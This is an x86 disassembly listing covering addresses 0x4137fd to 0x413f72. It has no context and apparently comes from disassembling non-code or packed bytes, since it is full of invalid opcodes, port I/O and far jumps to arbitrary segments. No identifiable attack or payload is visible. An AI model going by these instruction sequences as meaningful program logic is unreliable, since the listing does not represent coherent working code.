  4137fd:	cmp    eax,0xc6e4a3c9
  413802:	cmp    BYTE PTR [esi+0xb6a3551],ch
  413808:	fisttp QWORD PTR ds:0x159000bf
  41380e:	xchg   edi,eax
  41380f:	(bad)  
  413811:	lahf   
  413812:	repnz or dl,BYTE PTR [ebx-0x17d2126c]
  413819:	pop    ebx
  41381a:	das    
  41381b:	push   eax
  41381c:	(bad)  
  41381d:	sbb    al,0xa0
  41381f:	call   0xf2fe:0x67d3f2a0
  413826:	leave  
  413827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413828:	jmp    0x98f2e590
  41382d:	adc    eax,DWORD PTR [ecx]
  41382f:	mov    dh,0x89
  413831:	gs das 
  413833:	pushf  
  413834:	cmp    BYTE PTR ds:0xb717cef2,dh
  41383a:	add    edx,DWORD PTR [edx-0x36d71a15]
  413840:	push   edx
  413841:	lods   al,BYTE PTR ds:[esi]
  413842:	xor    bl,0xdf
  413845:	repnz aas 
  413847:	mov    cl,0xda
  413849:	stos   DWORD PTR es:[edi],eax
  41384a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41384b:	jmp    FWORD PTR [edx-0x34]
  41384e:	mov    al,0xb9
  413850:	push   edi
  413851:	cs daa 
  413853:	in     eax,dx
  413854:	idiv   DWORD PTR [ecx]
  413856:	adc    edx,esi
  413858:	pop    ds
  413859:	sbb    ebx,edi
  41385b:	stc    
  41385c:	adc    eax,0x99c3c167
  413861:	xchg   ecx,eax
  413862:	push   ecx
  413863:	xchg   edx,eax
  413864:	ins    BYTE PTR es:[edi],dx
  413865:	(bad)  
  413866:	stos   DWORD PTR es:[edi],eax
  413867:	and    eax,0xc2f499f1
  41386c:	lahf   
  41386d:	add    ebp,DWORD PTR [eax-0x49f68508]
  413873:	mov    bh,0xed
  413875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413876:	mov    dh,0xd0
  413878:	retf   0xbcc2
  41387b:	inc    edx
  41387c:	scas   eax,DWORD PTR es:[edi]
  41387d:	mov    al,0xcf
  41387f:	xchg   ebx,eax
  413880:	mov    al,ds:0x408c107c
  413885:	outs   dx,DWORD PTR ds:[esi]
  413886:	nop
  413887:	mov    ah,al
  413889:	xchg   DWORD PTR [eax],eax
  41388b:	ret    0x80ab
  41388e:	adc    ebx,DWORD PTR [ebx]
  413890:	sti    
  413891:	jns    0x413903
  413893:	iret   
  413894:	jo     0x41389b
  413896:	pop    es
  413897:	push   edi
  413898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413899:	add    BYTE PTR [esi-0x9],0xd8
  41389d:	rol    esp,1
  41389f:	fdiv   QWORD PTR [esi]
  4138a1:	ret    0x15ac
  4138a4:	bound  ecx,QWORD PTR [ecx-0x5272e428]
  4138aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138ab:	push   0xf799b567
  4138b0:	shl    DWORD PTR [edx],cl
  4138b2:	les    edi,FWORD PTR ds:0x6903179f
  4138b8:	pop    eax
  4138b9:	cli    
  4138ba:	lds    esp,FWORD PTR [ecx+0x4bedd205]
  4138c0:	dec    eax
  4138c1:	sub    DWORD PTR [esi-0x248bbdec],0x59244a51
  4138cb:	push   es
  4138cc:	dec    esi
  4138cd:	jo     0x413932
  4138cf:	cmp    al,BYTE PTR [ebp+ebp*1+0x64]
  4138d3:	popf   
  4138d4:	pop    es
  4138d5:	(bad)  
  4138d7:	jmp    0xf7ed6577
  4138dc:	adc    esp,edx
  4138de:	jg     0x413881
  4138e0:	cwde   
  4138e1:	mov    al,ds:0x2536ae96
  4138e6:	jp     0x4138de
  4138e8:	adc    BYTE PTR [edx+0x5b],dl
  4138eb:	ret    0xdafb
  4138ee:	rol    DWORD PTR [ebx+edi*1-0x64e25afc],1
  4138f5:	imul   esi,DWORD PTR [edi+0x0],0x44
  4138f9:	rcl    BYTE PTR [ebx-0x8],0x43
  4138fd:	push   0x24
  4138ff:	lock sub ch,BYTE PTR [edx+0x64]
  413903:	call   0xa042d2ec
  413908:	push   ss
  413909:	add    eax,0x9c193312
  41390e:	lods   eax,DWORD PTR ds:[esi]
  41390f:	dec    esi
  413910:	pusha  
  413911:	test   BYTE PTR [ebx-0x52],bh
  413914:	mov    al,0xef
  413916:	dec    ebp
  413917:	push   ecx
  413918:	fadd   DWORD PTR [eax]
  41391a:	mov    ds:0xf4fa226e,al
  41391f:	aad    0xd2
  413921:	jno    0x41399a
  413923:	ror    ah,cl
  413925:	mov    esi,0xc8c75ab6
  41392a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41392b:	pop    ebp
  41392c:	jbe    0x4138ed
  41392e:	jne    0x4138de
  413930:	gs out dx,eax
  413932:	push   ss
  413933:	daa    
  413934:	inc    esi
  413935:	adc    DWORD PTR [ebx],0xdcfb51ec
  41393b:	repz jg 0x413951
  41393e:	mov    ch,0xc4
  413940:	(bad)  
  413941:	cli    
  413942:	(bad)  [ebp+0x5e63a05c]
  413948:	(bad)  
  413949:	sti    
  41394a:	std    
  41394b:	cmc    
  41394c:	div    DWORD PTR [esi+0x31]
  41394f:	repz add edx,0x7ac65b83
  413956:	out    0x90,eax
  413958:	and    edi,ecx
  41395a:	adc    BYTE PTR [eiz*2-0x21eaadfc],bl
  413961:	push   edi
  413962:	cmp    BYTE PTR [eax+0x43],ah
  413965:	stc    
  413966:	scas   al,BYTE PTR es:[edi]
  413967:	rol    BYTE PTR [ebx+0x30bc292a],0xb9
  41396e:	scas   al,BYTE PTR es:[edi]
  41396f:	pop    esi
  413970:	fabs   
  413972:	xlat   BYTE PTR ds:[ebx]
  413973:	sub    cl,ah
  413975:	jecxz  0x41399d
  413977:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  413979:	adc    DWORD PTR [ebx+0x18],0xffffffb9
  41397d:	and    al,0x9c
  41397f:	out    dx,al
  413980:	(bad)  
  413981:	and    ebp,DWORD PTR [eax+0x741ac8e1]
  413987:	push   ecx
  413988:	lea    edi,[esi+0x53]
  41398b:	dec    eax
  41398c:	jnp    0x413a00
  41398e:	(bad)  
  41398f:	xchg   edi,eax
  413990:	inc    edx
  413991:	stos   DWORD PTR es:[edi],eax
  413992:	cld    
  413993:	or     BYTE PTR [ebx+0x23],0x98
  413997:	je     0x413993
  413999:	loopne 0x4139ac
  41399b:	shr    DWORD PTR [ecx+0xa],0x37
  41399f:	jo     0x4139a3
  4139a1:	mov    ebx,0xcddd7b3c
  4139a6:	or     eax,0x2ab19057
  4139ab:	out    0xd1,eax
  4139ad:	fsub   QWORD PTR [esp+ebp*4]
  4139b0:	dec    edx
  4139b1:	mov    ah,0x2
  4139b3:	scas   eax,DWORD PTR es:[edi]
  4139b4:	(bad)  
  4139b5:	in     al,0x3e
  4139b7:	pop    ds
  4139b8:	arpl   WORD PTR [eax+0x7eb736c2],cx
  4139be:	sbb    al,0x64
  4139c0:	loop   0x4139a5
  4139c2:	jge    0x4139fe
  4139c4:	inc    ebx
  4139c5:	int3   
  4139c6:	jne    0x413a10
  4139c8:	pop    ebx
  4139c9:	jp     0x4139a2
  4139cb:	pop    ecx
  4139cc:	inc    ecx
  4139cd:	out    0xab,eax
  4139cf:	xchg   edx,eax
  4139d0:	sbb    BYTE PTR [edi],dl
  4139d2:	push   esp
  4139d3:	je     0x413a51
  4139d5:	push   ds
  4139d6:	jmp    0x688b:0x80713a02
  4139dd:	test   BYTE PTR [ecx+0x3fe8dc90],dh
  4139e3:	addr16 jne 0xa3441a01
  4139ea:	cmp    eax,ecx
  4139ec:	xchg   edi,eax
  4139ed:	and    BYTE PTR [esi+0x5e],dh
  4139f0:	loopne 0x413a07
  4139f2:	pusha  
  4139f3:	(bad)  
  4139f4:	nop
  4139f5:	add    edx,eax
  4139f7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4139f9:	inc    esp
  4139fa:	fist   WORD PTR [esi]
  4139fc:	loop   0x413999
  4139fe:	push   esi
  4139ff:	inc    ecx
  413a00:	pop    ebx
  413a01:	stc    
  413a02:	add    eax,0x99a5cf76
  413a07:	dec    eax
  413a08:	xchg   ebp,eax
  413a09:	inc    esi
  413a0a:	add    al,0x7d
  413a0c:	jp     0x413a0c
  413a0e:	xor    DWORD PTR [eax],esi
  413a10:	sbb    al,0x3f
  413a12:	fld    QWORD PTR [eax-0x73]
  413a15:	or     eax,0x380e4817
  413a1a:	ja     0x413a05
  413a1c:	inc    edi
  413a1d:	xor    esi,DWORD PTR [ecx]
  413a1f:	sahf   
  413a20:	push   ecx
  413a21:	rcr    BYTE PTR [esi],0x3a
  413a24:	enter  0x1871,0xc5
  413a28:	test   DWORD PTR [eax+ebx*2+0x33bc12fa],ecx
  413a2f:	or     eax,0xa85002c
  413a34:	push   ebx
  413a35:	retf   
  413a36:	inc    eax
  413a37:	fild   DWORD PTR [ebx]
  413a39:	mov    edx,0x9e5c00a6
  413a3e:	mov    al,ds:0xeeb2d785
  413a43:	ins    DWORD PTR es:[edi],dx
  413a44:	dec    edi
  413a45:	mov    esi,0xe5967128
  413a4a:	jp     0x413aaa
  413a4c:	(bad)  
  413a4d:	stc    
  413a4e:	nop
  413a4f:	je     0x413a11
  413a51:	inc    ebp
  413a52:	dec    ebx
  413a53:	mov    ah,0x84
  413a55:	pop    ds
  413a56:	jge    0x413a93
  413a58:	add    esi,edx
  413a5a:	add    al,0x2d
  413a5c:	mov    al,0x58
  413a5e:	mov    eax,0x84fb401f
  413a63:	les    esi,FWORD PTR [eax]
  413a65:	dec    edi
  413a66:	ret    
  413a67:	jg     0x413a38
  413a69:	or     bh,BYTE PTR [edi+0x3]
  413a6c:	lods   eax,DWORD PTR ds:[esi]
  413a6d:	nop
  413a6e:	pop    ss
  413a6f:	fucom  st(4)
  413a71:	pop    edi
  413a72:	enter  0x80a8,0xa0
  413a76:	cmp    eax,DWORD PTR [esi+0x3b]
  413a79:	or     eax,DWORD PTR [eax+0x6b]
  413a7c:	inc    eax
  413a7d:	int    0x75
  413a7f:	xor    eax,0x2f06cd91
  413a84:	xchg   bl,dl
  413a86:	in     eax,dx
  413a87:	sbb    dl,BYTE PTR [ebp-0xdc154dc]
  413a8d:	out    dx,eax
  413a8e:	int    0xc9
  413a90:	sbb    BYTE PTR [edi],0xbc
  413a93:	dec    edx
  413a94:	sub    ebp,esi
  413a96:	inc    ecx
  413a97:	test   DWORD PTR [esi+0x62],eax
  413a9a:	push   ecx
  413a9b:	bnd jp 0x413a79
  413a9e:	dec    ebp
  413a9f:	push   ebp
  413aa0:	mov    ah,0x4
  413aa2:	dec    edx
  413aa3:	pop    ss
  413aa4:	fstp   st(6)
  413aa6:	sahf   
  413aa7:	xchg   BYTE PTR [edi+0x27da6633],al
  413aad:	mov    dl,0x8
  413aaf:	loopne 0x413af4
  413ab1:	jo     0x413a62
  413ab3:	outs   dx,BYTE PTR ds:[esi]
  413ab4:	cli    
  413ab5:	test   al,0x9d
  413ab7:	repz mov edi,0x7d2e59d0
  413abd:	fiadd  DWORD PTR [ebp+0x22]
  413ac0:	retf   0x1f
  413ac3:	mov    edi,0x20c89aa0
  413ac8:	pop    ebp
  413ac9:	mov    al,0x19
  413acb:	xchg   ecx,eax
  413acc:	cmp    edx,0x7d
  413acf:	popf   
  413ad0:	scas   al,BYTE PTR es:[edi]
  413ad1:	xor    esi,DWORD PTR [ecx+0x3ae268d8]
  413ad7:	scas   eax,DWORD PTR es:[edi]
  413ad8:	fist   WORD PTR [edi+0x2bd0a402]
  413ade:	lds    edx,FWORD PTR [ecx+0x6c]
  413ae1:	mov    ebx,DWORD PTR ds:0x9d268b5c
  413ae7:	out    dx,al
  413ae8:	stos   BYTE PTR es:[edi],al
  413ae9:	jge    0x413ae0
  413aeb:	out    dx,eax
  413aec:	js     0x413af7
  413aee:	out    dx,eax
  413aef:	ret    
  413af0:	(bad)  
  413af1:	mov    bh,0xe9
  413af3:	add    eax,0x6a245fc6
  413af8:	inc    esi
  413af9:	push   cs
  413afa:	pop    edx
  413afb:	ror    bh,1
  413afd:	mov    WORD PTR [ebx-0x49],?
  413b00:	jmp    0xc9fd885f
  413b05:	add    dh,bl
  413b07:	aaa    
  413b08:	jmp    0x413b67
  413b0a:	lods   eax,DWORD PTR ds:[esi]
  413b0b:	lea    ecx,ds:0x3c0d64c0
  413b11:	popa   
  413b12:	(bad)  
  413b13:	mov    ebx,0xa6ba25b2
  413b18:	es pop ecx
  413b1a:	ret    0x3d58
  413b1d:	jecxz  0x413ac1
  413b1f:	sbb    eax,0xc2c4a36f
  413b24:	jmp    0x413afc
  413b26:	jp     0x413b0f
  413b28:	idiv   BYTE PTR [eax+0x5c]
  413b2b:	test   al,0xaf
  413b2d:	adc    DWORD PTR [esi+0x5c7479cd],esp
  413b33:	cmp    ebx,DWORD PTR [edi-0x38]
  413b36:	mov    DWORD PTR [esi],edi
  413b38:	jge    0x413b7a
  413b3a:	sar    DWORD PTR [esi+0x1f],0x4b
  413b3e:	sbb    dl,BYTE PTR fs:[ecx-0x33a1afb8]
  413b45:	push   edi
  413b46:	inc    edi
  413b47:	aad    0x69
  413b49:	cmp    ah,BYTE PTR [edi-0x7c]
  413b4c:	or     eax,0x7c91d92a
  413b51:	jo     0x413b41
  413b53:	idiv   esp
  413b55:	jp     0x413bc4
  413b57:	mov    dh,0x69
  413b59:	sub    eax,DWORD PTR [edx]
  413b5b:	pop    ebx
  413b5c:	cli    
  413b5d:	and    dh,dl
  413b5f:	das    
  413b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b61:	adc    DWORD PTR [edi],eax
  413b63:	ss mov eax,0x9efcba3a
  413b69:	in     al,dx
  413b6a:	inc    edx
  413b6b:	in     al,dx
  413b6c:	jmp    0x413b67
  413b6e:	(bad)  
  413b6f:	fnstsw WORD PTR [eax-0x53eebe4b]
  413b75:	in     al,dx
  413b76:	mul    DWORD PTR ds:0x8f31d70
  413b7c:	and    DWORD PTR [eax-0x3fb7f11e],ebp
  413b82:	add    al,0xc0
  413b84:	ins    DWORD PTR es:[edi],dx
  413b85:	sub    ah,BYTE PTR [eax-0x6f]
  413b88:	jo     0x413b1e
  413b8a:	outs   dx,BYTE PTR ds:[esi]
  413b8b:	ror    DWORD PTR [ecx+0x44],0x92
  413b8f:	xor    DWORD PTR [ecx-0x52],0xd687faa9
  413b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b97:	jmp    0x413b50
  413b99:	loope  0x413b90
  413b9b:	jmp    0x64f3:0xc57dd7b5
  413ba2:	sub    BYTE PTR [ebx+0x4d],dh
  413ba5:	das    
  413ba6:	mov    bh,0xf7
  413ba8:	jae    0x413baa
  413baa:	leave  
  413bab:	sub    edx,DWORD PTR [ecx]
  413bad:	xor    edi,DWORD PTR [edx]
  413baf:	int3   
  413bb0:	into   
  413bb1:	stc    
  413bb2:	aaa    
  413bb3:	and    BYTE PTR [edx],ah
  413bb5:	mov    DWORD PTR [ecx+0x4739b834],ebx
  413bbb:	(bad)  
  413bbc:	stos   DWORD PTR es:[edi],eax
  413bbd:	xchg   ecx,eax
  413bbe:	aad    0x6f
  413bc0:	cmp    esi,DWORD PTR [esi]
  413bc2:	out    0xf6,eax
  413bc4:	or     dh,BYTE PTR [ebx+0x5113af87]
  413bca:	into   
  413bcb:	mov    cl,BYTE PTR [edx+0x2d]
  413bce:	mov    eax,ds:0x83d58d91
  413bd3:	sub    al,0x92
  413bd5:	mov    ds:0x99c89c11,al
  413bda:	(bad)  
  413bdb:	(bad)  [eax]
  413bdd:	sti    
  413bde:	fisub  WORD PTR [eax-0x4650abe7]
  413be4:	xor    edx,DWORD PTR [ebx-0x34]
  413be7:	xchg   ecx,eax
  413be8:	lahf   
  413be9:	add    DWORD PTR [ebp-0x581c8022],0x9c76cfda
  413bf3:	adc    eax,0x1bc25479
  413bf8:	add    esp,DWORD PTR ds:0xb87d3ef4
  413bfe:	jp     0x413c5a
  413c00:	xor    BYTE PTR [edx+0x1b],ah
  413c03:	outs   dx,DWORD PTR ds:[esi]
  413c04:	xchg   esi,eax
  413c05:	loope  0x413bcb
  413c07:	sbb    bl,BYTE PTR [ecx-0x1bf3157b]
  413c0d:	xor    eax,0x3d368ed2
  413c12:	rcl    DWORD PTR [eax],0xc6
  413c15:	or     DWORD PTR [edi-0x67],0x310642a3
  413c1c:	sub    dl,dh
  413c1e:	inc    edx
  413c1f:	pop    edx
  413c20:	int    0x6c
  413c22:	jp     0x413c9e
  413c24:	jb     0x413bd9
  413c26:	adc    eax,DWORD PTR [eax]
  413c28:	(bad)
  413c2d:	ret    0x765a
  413c30:	jp     0x413bb7
  413c32:	repz repz sub BYTE PTR [eax+0x34699989],ch
  413c3a:	stos   DWORD PTR es:[edi],eax
  413c3b:	call   0x3b5f:0x3388e4e1
  413c42:	jb     0x413c34
  413c44:	out    0x24,al
  413c46:	mov    ?,WORD PTR [ecx+0x4cafee7e]
  413c4c:	push   esp
  413c4d:	retf   
  413c4e:	push   esp
  413c4f:	(bad)  
  413c50:	scas   eax,DWORD PTR es:[edi]
  413c51:	js     0x413be1
  413c53:	outs   dx,BYTE PTR ds:[esi]
  413c54:	ret    
  413c55:	imul   ebx,DWORD PTR [ebx],0xffffffdb
  413c58:	in     al,dx
  413c59:	sbb    esi,DWORD PTR [eax+0x3a]
  413c5c:	fwait
  413c5d:	mov    WORD PTR [edx+0x24],?
  413c60:	sbb    ecx,0xffffff90
  413c63:	test   eax,0xd4ef038
  413c68:	leave  
  413c69:	mov    edx,0x50c17476
  413c6e:	jbe    0x413cd1
  413c70:	(bad)  
  413c71:	lods   al,BYTE PTR ds:[esi]
  413c72:	das    
  413c73:	adc    bh,BYTE PTR [ebp+0x57]
  413c76:	jg     0x413c2e
  413c78:	mov    ah,BYTE PTR [eax+0x6e]
  413c7b:	and    DWORD PTR [esi-0x590d08bf],edx
  413c81:	xor    dl,BYTE PTR [eax+edx*4-0x12]
  413c85:	shl    BYTE PTR [eax+0x27],0x13
  413c89:	popf   
  413c8a:	cmp    ebx,edx
  413c8c:	add    cl,dl
  413c8e:	add    al,0xc0
  413c90:	xor    DWORD PTR [esi+ebp*8+0x7d1f8d3],esi
  413c97:	sahf   
  413c98:	fcom   DWORD PTR ds:0x95b4a4a1
  413c9e:	scas   eax,DWORD PTR es:[edi]
  413c9f:	icebp  
  413ca0:	pop    esi
  413ca1:	repz xchg esp,eax
  413ca3:	fidiv  DWORD PTR [ecx-0x1b]
  413ca6:	mov    eax,0x2de8cdd7
  413cab:	fs (bad) 
  413cad:	lahf   
  413cae:	mov    ebx,0x77d4129e
  413cb3:	ins    DWORD PTR es:[edi],dx
  413cb4:	xor    BYTE PTR [edx-0x62],0x89
  413cb8:	cmp    eax,0xc7c3268e
  413cbd:	scas   eax,DWORD PTR es:[edi]
  413cbe:	xchg   edi,eax
  413cbf:	shr    DWORD PTR [ecx-0x2c],0x9d
  413cc3:	inc    ebx
  413cc4:	out    0xd0,al
  413cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cc7:	adc    eax,0x58582afc
  413ccc:	and    al,0xe3
  413cce:	cld    
  413ccf:	jl     0x413c51
  413cd1:	icebp  
  413cd2:	shl    ebp,0x1d
  413cd5:	test   al,0xa6
  413cd7:	xlat   BYTE PTR ds:[ebx]
  413cd8:	xor    edx,DWORD PTR [edx-0x18dd8ac8]
  413cde:	push   cs
  413cdf:	into   
  413ce0:	pop    es
  413ce1:	and    edx,eax
  413ce3:	jo     0x413ce2
  413ce5:	ds sub eax,0x43519efa
  413ceb:	and    al,0x19
  413ced:	push   ss
  413cee:	bound  eax,QWORD PTR [eax]
  413cf0:	icebp  
  413cf1:	jecxz  0x413caa
  413cf3:	loope  0x413d4e
  413cf5:	mov    WORD PTR [ecx+0x22],cs
  413cf8:	cli    
  413cf9:	and    edx,DWORD PTR [eax]
  413cfb:	xor    BYTE PTR [edi-0x5f],al
  413cfe:	stos   BYTE PTR es:[edi],al
  413cff:	sub    bh,BYTE PTR [ecx+esi*4-0x60065495]
  413d06:	dec    edi
  413d07:	popa   
  413d08:	and    BYTE PTR [ecx+0x6c14e00b],0x8
  413d0f:	enter  0xe92,0xba
  413d13:	(bad)  
  413d14:	popa   
  413d15:	fdivr  QWORD PTR [edi+ebx*1+0x6c]
  413d19:	aas    
  413d1a:	inc    esi
  413d1b:	jecxz  0x413d7a
  413d1d:	push   ebx
  413d1e:	sbb    DWORD PTR [ecx],eax
  413d20:	push   edx
  413d21:	in     al,dx
  413d22:	gs aam 0x14
  413d25:	imul   eax,DWORD PTR [ebx+edi*2],0x38
  413d29:	(bad)  
  413d2a:	push   ds
  413d2b:	mov    cs,ecx
  413d2d:	call   0x3c0c:0x39a7f826
  413d34:	add    DWORD PTR [ecx-0x18631cec],ebp
  413d3a:	push   ss
  413d3b:	hlt    
  413d3c:	dec    edi
  413d3d:	cmp    DWORD PTR [eax],0xbd8a9629
  413d43:	mov    dl,0xa9
  413d45:	sub    ch,dl
  413d47:	in     eax,dx
  413d48:	xor    BYTE PTR [ebx-0x24b534bd],ah
  413d4e:	out    0xe9,al
  413d50:	and    al,0xf0
  413d52:	sar    BYTE PTR [ecx-0x1e373221],cl
  413d58:	jb     0x413d07
  413d5a:	mov    edx,0xac14c82
  413d5f:	push   esi
  413d60:	aam    0x9
  413d62:	cld    
  413d63:	xchg   ebx,eax
  413d64:	add    BYTE PTR [ebx+0x41d7c46d],dl
  413d6a:	jbe    0x413db0
  413d6c:	test   DWORD PTR [ebx+0x3],edx
  413d6f:	cld    
  413d70:	add    DWORD PTR [ecx+0xa],eax
  413d73:	mov    al,0xcd
  413d75:	mov    bl,0xed
  413d77:	add    al,0x5f
  413d79:	xor    al,0x15
  413d7b:	into   
  413d7c:	repz cmp BYTE PTR [eax-0x23ac3b0d],0x47
  413d84:	popa   
  413d85:	dec    esp
  413d86:	and    ebx,DWORD PTR [ebx]
  413d88:	and    bh,ch
  413d8a:	sub    ah,BYTE PTR [eax+0x20]
  413d8d:	je     0x413db9
  413d8f:	inc    edi
  413d90:	xor    DWORD PTR [ebp-0x31],edx
  413d93:	push   ecx
  413d94:	pusha  
  413d95:	inc    eax
  413d96:	fcomp  st(5)
  413d98:	jnp    0x413dfd
  413d9a:	ret    
  413d9b:	mov    BYTE PTR ds:0x988d358b,bl
  413da1:	pop    ebp
  413da2:	ja     0x413d5c
  413da4:	ins    BYTE PTR es:[edi],dx
  413da5:	jns    0x413d5e
  413da7:	sbb    eax,esp
  413da9:	mul    BYTE PTR [esi+0x26738d69]
  413daf:	pop    esi
  413db0:	or     bh,bl
  413db2:	cli    
  413db3:	jns    0x413d68
  413db5:	and    DWORD PTR [eax],eax
  413db7:	mov    WORD PTR [esi-0x58],fs
  413dba:	sub    esp,esp
  413dbc:	and    al,0x7
  413dbe:	mov    ch,0x6a
  413dc0:	mov    eax,ds:0xb8550818
  413dc5:	mov    bl,0x53
  413dc7:	or     eax,0xe9eafa0e
  413dcc:	cmp    al,0x8b
  413dce:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  413dd0:	jle    0x413dc4
  413dd2:	push   edx
  413dd3:	jmp    0xe373c820
  413dd8:	cmovge ecx,DWORD PTR [ebp-0x28]
  413ddc:	out    0xfd,eax
  413dde:	mov    BYTE PTR [eax+0x42],dh
  413de1:	jl     0x413e07
  413de3:	test   DWORD PTR [edx+0x5f],ebp
  413de6:	(bad)  
  413de7:	ja     0x413e14
  413de9:	push   edi
  413dea:	xchg   DWORD PTR [eax+0x57],esi
  413ded:	cwde   
  413dee:	pop    edi
  413def:	sub    DWORD PTR [esi+0x5],eax
  413df2:	push   ss
  413df3:	mov    WORD PTR [edx+ebx*8-0x19],gs
  413df7:	xor    cl,0x8b
  413dfa:	mov    ds:0xee7f950e,eax
  413dff:	mov    eax,ds:0xa96ae37a
  413e04:	push   ebx
  413e05:	jb     0x413e64
  413e07:	ins    DWORD PTR es:[edi],dx
  413e08:	and    al,0xda
  413e0a:	sti    
  413e0b:	hlt    
  413e0c:	in     ax,dx
  413e0e:	jl     0x413ddd
  413e10:	push   edx
  413e11:	fs adc al,0xea
  413e14:	push   0xe229b3e3
  413e19:	push   esi
  413e1a:	sub    BYTE PTR [eax],ch
  413e1c:	jbe    0x413e1b
  413e1e:	les    eax,FWORD PTR ds:0x925287b1
  413e24:	mov    cl,0x92
  413e26:	mov    edi,0x9fe690ee
  413e2b:	pusha  
  413e2c:	xor    al,0x64
  413e2e:	mov    al,0x8
  413e30:	shr    DWORD PTR [ecx],cl
  413e32:	xor    eax,edx
  413e34:	lds    esp,FWORD PTR [esi]
  413e36:	mov    dh,0x90
  413e38:	and    DWORD PTR [ecx-0x38787d94],ebx
  413e3e:	mov    BYTE PTR [ebp+0x38c5c6d5],bh
  413e44:	pop    esp
  413e45:	ret    
  413e46:	aam    0x95
  413e48:	push   ds
  413e49:	pop    ss
  413e4a:	pop    esp
  413e4b:	mov    esi,0x80598290
  413e50:	lods   al,BYTE PTR ds:[esi]
  413e51:	fst    DWORD PTR [edi]
  413e53:	dec    ecx
  413e54:	enter  0x226d,0x6b
  413e58:	sti    
  413e59:	test   eax,0x1f4ef1c9
  413e5e:	(bad)  
  413e5f:	mov    bh,0x9
  413e61:	loop   0x413e71
  413e63:	outs   dx,BYTE PTR ds:[esi]
  413e64:	pop    edi
  413e65:	cmp    al,0xa9
  413e67:	mov    eax,ds:0x7046a286
  413e6c:	clc    
  413e6d:	sahf   
  413e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e6f:	(bad)  
  413e70:	jp     0x413eb8
  413e72:	push   ebx
  413e73:	jae    0x413e79
  413e75:	js     0x413e97
  413e77:	xchg   edi,eax
  413e78:	sbb    DWORD PTR [esi+0x2f],0x36
  413e7c:	add    al,0xdb
  413e7e:	stos   DWORD PTR es:[edi],eax
  413e7f:	fwait
  413e80:	(bad)  
  413e81:	pop    edx
  413e82:	add    ebx,ecx
  413e84:	popf   
  413e85:	cmp    DWORD PTR [eax],eax
  413e87:	push   edx
  413e88:	jp     0x413e81
  413e8a:	xchg   ebp,eax
  413e8b:	(bad)  
  413e8c:	test   eax,0x2ad9ea6c
  413e91:	push   ss
  413e92:	ds aad 0xe0
  413e95:	mov    edx,0x7bffc1b0
  413e9a:	dec    ecx
  413e9b:	scas   eax,DWORD PTR es:[edi]
  413e9c:	jb     0x413ecf
  413e9e:	arpl   di,cx
  413ea0:	mov    gs:0xf0cb94f4,eax
  413ea6:	xchg   edi,eax
  413ea7:	and    edi,DWORD PTR [edi]
  413ea9:	xchg   DWORD PTR [esi-0x60],esi
  413eac:	jo     0x413e33
  413eae:	or     eax,0x85342b09
  413eb3:	or     BYTE PTR [esi],dh
  413eb5:	sub    esi,0x0
  413eb8:	jle    0x413efa
  413eba:	push   eax
  413ebb:	in     eax,dx
  413ebc:	int3   
  413ebd:	jne    0x413f22
  413ebf:	mov    ?,WORD PTR [ecx]
  413ec1:	aas    
  413ec2:	lea    ebx,[ecx]
  413ec4:	xchg   edx,eax
  413ec5:	scas   eax,DWORD PTR es:[edi]
  413ec6:	call   0x15c8561e
  413ecb:	cli    
  413ecc:	push   eax
  413ecd:	lahf   
  413ece:	into   
  413ecf:	push   ebx
  413ed0:	and    al,0x7f
  413ed2:	(bad)  
  413ed3:	jle    0x413e92
  413ed5:	dec    eax
  413ed6:	stc    
  413ed7:	sbb    ebp,DWORD PTR [edx+ecx*8-0x4]
  413edb:	mov    BYTE PTR [esp+ebp*2+0x47e0834f],bh
  413ee2:	cmp    DWORD PTR [eax+0x7b],esi
  413ee5:	inc    ecx
  413ee6:	xchg   BYTE PTR [edi],ah
  413ee8:	(bad)  
  413ee9:	ins    DWORD PTR es:[edi],dx
  413eea:	hlt    
  413eeb:	inc    esp
  413eec:	push   ebx
  413eed:	mov    dl,0x44
  413eef:	jne    0x413f6c
  413ef1:	inc    esi
  413ef2:	mov    ch,0x33
  413ef4:	mov    eax,ds:0xca9e8776
  413ef9:	cmp    ecx,DWORD PTR [esi-0x4cee597d]
  413eff:	sub    al,0x6f
  413f01:	cmp    al,0x56
  413f03:	mov    eax,0x913c8148
  413f08:	loope  0x413e91
  413f0a:	xchg   esp,eax
  413f0b:	enter  0x1042,0x3e
  413f0f:	add    BYTE PTR [eax-0x2da51b2a],al
  413f15:	mov    dh,0x52
  413f17:	jmp    0x3a81:0xb88e0f7c
  413f1e:	aad    0xdd
  413f20:	adc    BYTE PTR [esi],0xf1
  413f23:	aam    0xbd
  413f25:	(bad)  [edi]
  413f27:	sti    
  413f28:	sbb    dh,BYTE PTR [ebp+0x68]
  413f2b:	or     DWORD PTR [edx],ebx
  413f2d:	dec    edi
  413f2e:	mov    ecx,0x795be413
  413f33:	jge    0x413ebd
  413f35:	test   DWORD PTR [bx+si-0x2e],ebp
  413f39:	sbb    DWORD PTR [ebx],eax
  413f3b:	out    dx,eax
  413f3c:	pop    ebx
  413f3d:	jne    0x413f2d
  413f3f:	mov    esp,0x7d199a85
  413f44:	adc    bh,bl
  413f46:	sbb    eax,0x421130b9
  413f4b:	xor    BYTE PTR [edi-0x4f],ah
  413f4e:	cmp    eax,0x17a06cf
  413f53:	popf   
  413f54:	inc    ebx
  413f55:	add    BYTE PTR [edi-0x3c],dl
  413f58:	fistp  QWORD PTR [ebx+0x7fdf5070]
  413f5e:	std    
  413f5f:	xchg   esi,edi
  413f61:	das    
  413f62:	je     0x413f9e
  413f64:	xor    al,BYTE PTR [esi]
  413f66:	jmp    0x413ee8
  413f68:	or     BYTE PTR [ecx],bh
  413f6a:	sbb    DWORD PTR ds:[ebx-0x43],esi
  413f6e:	test   al,0xfe
  413f70:	adc    ebp,DWORD PTR [eax]
  413f72:	inc    ebx
